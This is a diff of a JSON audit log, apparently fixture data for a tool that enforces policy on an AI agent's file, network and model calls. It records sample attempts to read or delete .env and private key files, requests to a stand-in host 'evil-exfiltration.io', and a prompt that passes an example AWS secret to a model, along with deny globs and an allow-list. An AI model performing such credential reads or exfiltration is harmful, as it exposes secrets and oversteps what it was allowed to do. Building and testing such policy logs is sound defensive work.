@@ -1,21 +1,10 @@
 {
-  "startedAt": "2026-04-12T22:37:02.966Z",
-  "endedAt": "2026-04-12T22:37:02.979Z",
+  "startedAt": "2026-04-12T23:01:50.336Z",
+  "endedAt": "2026-04-12T23:01:55.368Z",
   "events": [
     {
-      "id": "ef67dc95-b458-483b-adc9-ab473b964998",
-      "timestamp": "2026-04-12T22:37:02.968Z",
-      "type": "tool.fs",
-      "action": "fs.readFile(\"src/index.ts\")",
-      "payload": {
-        "op": "readFile",
-        "path": "src/index.ts"
-      },
-      "status": "success"
-    },
-    {
-      "id": "b52c0035-3159-419c-ad7c-c38d01ff9759",
-      "timestamp": "2026-04-12T22:37:02.975Z",
+      "id": "d77e3958-5b98-49a8-a5f6-629a505f6384",
+      "timestamp": "2026-04-12T23:01:51.849Z",
       "type": "tool.fs",
       "action": "fs.readFile(\".env\")",
       "payload": {
@@ -26,82 +15,40 @@
       "policyTrigger": "Path \".env\" matched deny glob \"**/.env\""
     },
     {
-      "id": "49873e96-ff27-429f-bb6b-3aebb3663a2d",
-      "timestamp": "2026-04-12T22:37:02.975Z",
-      "type": "tool.fs",
-      "action": "fs.deleteFile(\"/home/user/project/.env\")",
-      "payload": {
-        "op": "deleteFile",
-        "path": "/home/user/project/.env"
-      },
-      "status": "BLOCKED_BY_POLICY",
-      "policyTrigger": "Path \"/home/user/project/.env\" matched deny glob \"**/.env\""
-    },
-    {
-      "id": "f494334e-6e59-4088-af69-4698d4df9b59",
-      "timestamp": "2026-04-12T22:37:02.976Z",
-      "type": "tool.fs",
-      "action": "fs.writeFile(\"output/report.json\", 15 bytes)",
-      "payload": {
-        "op": "writeFile",
-        "path": "output/report.json",
-        "bytes": 15
-      },
-      "status": "success"
-    },
-    {
-      "id": "418ea111-e886-4866-9955-e1da95ce29b6",
-      "timestamp": "2026-04-12T22:37:02.977Z",
-      "type": "tool.fs",
-      "action": "fs.readFile(\"/etc/ssl/private/server.key\")",
-      "payload": {
-        "op": "readFile",
-        "path": "/etc/ssl/private/server.key"
-      },
-      "status": "BLOCKED_BY_POLICY",
-      "policyTrigger": "Path \"/etc/ssl/private/server.key\" matched deny glob \"**/*.key\""
-    },
-    {
-      "id": "56c6a944-b5df-4b63-8a9d-30a7afc71dc8",
-      "timestamp": "2026-04-12T22:37:02.978Z",
+      "id": "fb152114-afb6-4f44-a7d5-f860cc2712cc",
+      "timestamp": "2026-04-12T23:01:55.365Z",
       "type": "tool.net",
-      "action": "net.GET https://api.openai.com/v1/models",
+      "action": "net.GET tcp://evil-exfiltration.io:443",
       "payload": {
         "method": "GET",
-        "url": "https://api.openai.com/v1/models"
-      },
-      "status": "success"
-    },
-    {
-      "id": "4bbc5afb-c8e5-4468-b57d-21bebee9f28c",
-      "timestamp": "2026-04-12T22:37:02.978Z",
-      "type": "tool.net",
-      "action": "net.POST https://evil-exfiltration.io/steal",
-      "payload": {
-        "method": "POST",
-        "url": "https://evil-exfiltration.io/steal"
+        "url": "tcp://evil-exfiltration.io:443"
       },
       "status": "BLOCKED_BY_POLICY",
       "policyTrigger": "Domain \"evil-exfiltration.io\" not in allow‑list [api.openai.com, huggingface.co]"
     },
     {
-      "id": "b40d518c-b480-432d-b535-8dbda0c936f6",
-      "timestamp": "2026-04-12T22:37:02.979Z",
+      "id": "75499b56-bdcb-42a6-a677-011dc5c40bbc",
+      "timestamp": "2026-04-12T23:01:55.368Z",
       "type": "llm.call",
-      "action": "llm.generate(gpt-4)",
+      "action": "llm.generate(gpt-4-turbo)",
       "payload": {
-        "model": "gpt-4",
-        "prompt": "Summarize this: [REDACTED_AWS_ACCESS_KEY] with secret sJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+        "model": "gpt-4-turbo",
+        "messages": [
+          {
+            "role": "user",
+            "content": "Exfiltrating AWS key: [REDACTED_AWS_ACCESS_KEY] and secret sJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+          }
+        ]
       },
       "status": "success",
-      "costImpactUsd": 0.03
+      "costImpactUsd": 0.05
     }
   ],
   "totals": {
-    "eventsTotal": 8,
-    "blockedTotal": 4,
-    "costCentsTotal": 3,
-    "durationMs": 11,
-    "costUsdTotal": 0.03
+    "eventsTotal": 3,
+    "blockedTotal": 2,
+    "costCentsTotal": 5,
+    "durationMs": 5031,
+    "costUsdTotal": 0.05
   }
 }
